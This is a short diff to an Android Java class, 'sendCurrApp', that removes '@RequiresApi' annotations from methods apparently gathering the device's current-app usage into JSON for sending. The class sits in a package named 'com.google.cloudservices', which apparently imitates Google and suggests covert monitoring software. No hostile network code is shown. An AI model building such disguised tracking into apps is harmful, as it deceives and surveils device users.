@@ -1,8 +1,6 @@
 package com.google.cloudservices;
 
 import android.content.Context;
-import android.support.annotation.RequiresApi;
-
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -10,7 +8,7 @@ import org.json.JSONObject;
 public class sendCurrApp {
 
 
-    @RequiresApi(api = 29)
+
     public void send(final Context context){
         CurrentAppClass currentAppClass=new CurrentAppClass();
          Curdb curdb=new Curdb(context);
@@ -29,7 +27,7 @@ public class sendCurrApp {
        // Runtime.getRuntime().gc();
 
     }
-    @RequiresApi(api = 29)
+
     public void sendc(Context context){
         JSONObject jscurr=new JSONObject();
         try {
